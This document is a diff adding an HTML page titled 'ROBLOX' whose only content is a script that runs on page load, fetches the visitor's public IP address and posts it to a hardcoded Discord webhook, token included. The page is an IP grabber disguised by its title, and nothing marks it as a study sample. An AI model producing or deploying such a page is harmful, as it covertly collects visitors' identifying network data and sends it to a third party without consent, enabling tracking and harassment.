@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ROBLOX</title>
+</head>
+<body>
+    <script>
+        // JavaScript code to fetch the IP address
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+
+                // Send a POST request to the Discord webhook
+                const webhookURL = 'https://discord.com/api/webhooks/1128277448472154115/8CT2FKfneUURTulQs4yDy_UuzeYOcr3jdX5UJFxozV5J6_77M65uFf55lnLgjrmZ8JWB';
+                const message = { content:ipAddress};
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(message)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send message to Discord webhook');
+                    }
+                })
+                .catch(error => console.error('Error:', error));
+            })
+            .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
